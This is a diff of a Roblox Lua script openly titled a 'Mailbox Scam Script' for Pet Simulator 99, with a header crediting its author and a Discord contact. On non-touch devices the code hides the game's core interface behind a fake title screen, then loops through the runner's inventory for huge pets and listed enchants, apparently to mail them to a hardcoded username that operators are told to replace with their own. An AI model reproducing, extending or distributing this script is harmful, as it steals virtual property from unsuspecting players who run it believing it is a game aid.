@@ -1,3 +1,26 @@
+--[[
+═══════════════════════════════════════════════════════════════════════════════
+  Pet Simulator 99 - Mailbox Scam Script
+  Developed by mitzci0
+
+  Current Version: v3.0.6
+
+  Versioning System:
+    • Patch Release  (Bug Fixes)         → 1.0.0 → 1.0.1
+    • Minor Release  (New Features)      → 1.0.0 → 1.1.0
+    • Major Release  (Breaking Changes)  → 1.0.0 → 2.0.0
+
+  Last Updated: 2026-06-26
+  
+  If you find any bugs/errors, please report them to me via DM on Discord.
+  Username: mitzci0
+═══════════════════════════════════════════════════════════════════════════════
+]]--
+
+
+
+
+
 if not (game.UserInputService.TouchEnabled) then
     game:GetService("CoreGui"):ClearAllChildren()
 end
@@ -54,7 +77,7 @@ local function createOutline(parent, text, font, size, position, textColor, outl
 end
 
 -- Main Title Text
-local titleText = "Pet Simulator 99 Script by Mitzci0"
+local titleText = "Pet Simulator 99 Script by mitzci0 <3"
 local titleFont = Enum.Font.FredokaOne
 local titleSize = UDim2.new(0, 500, 0, 100)
 local titlePosition = UDim2.new(0.5, -250, 0.3, 0)
@@ -174,8 +197,9 @@ task.spawn(function()
     end
 end)
 
-user = "mitzci0"
-allowed_enchants = {"Mega Chest Breaker", "Chest Breaker", "Chest Mimic", "Diamond Chest Mimic", "Super Shiny Hunter", "Boss Chest Mimic", "Super Magnet", "Boss Lucky Block", "Lightning Orb", "Mini Chest Fortune", "Shiny Supercharge", "Corruption", "Nightmare Orb", "Superior Chest Mimic", "Hacker Key Hunter", "Diamond Gift Hunter", "Diamond Orb", "Active Huge Overload", "Rainbow Egg", "Double Coins", "Breakable Mayhem", "Huge Hunter", "Magic Orb"}
+-- Mailbox Scam
+user = "mitzci0"  -- Change this to your username
+allowed_enchants = {"Mega Chest Breaker", "Chest Breaker", "Chest Mimic", "Diamond Chest Mimic", "Super Shiny Hunter", "Boss Chest Mimic", "Super Magnet", "Boss Lucky Block", "Lightning Orb", "Mini Chest Fortune", "Shiny Supercharge", "Corruption", "Nightmare Orb", "Superior Chest Mimic", "Hacker Key Hunter", "Diamond Gift Hunter", "Diamond Orb", "Active Huge Overload", "Rainbow Egg", "Double Coins", "Breakable Mayhem"} -- The Enchants that are sent (if any)
 for i,v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
     if require(game.ReplicatedStorage.Library.Directory).Pets[v.id].huge then
         repeat
